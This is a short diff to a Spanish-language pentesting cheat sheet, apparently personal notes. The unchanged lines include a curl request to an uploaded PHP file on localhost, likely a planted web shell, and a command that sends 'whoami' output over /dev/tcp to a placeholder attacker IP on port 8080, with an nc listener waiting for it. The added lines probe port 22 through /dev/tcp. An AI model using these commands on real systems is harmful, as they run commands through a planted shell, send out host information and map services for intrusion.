@@ -51,9 +51,12 @@ curl -s -X GET "http://localhost:puerto/upload/archivo.php" -G --data-urlencode 
 
 - PAra enviar comandos a un puerto en escucha
 
-
-
 ```bash
 `whoami > /dev/tcp/ipatacante/8080 0>&1`
 nc -nlvp 8080
+```
+
+- Para saber si un proceso por un puerto está corriendo PJ: 22
+```bash
+echo '' > /dev/tcp/ip/22
 ```
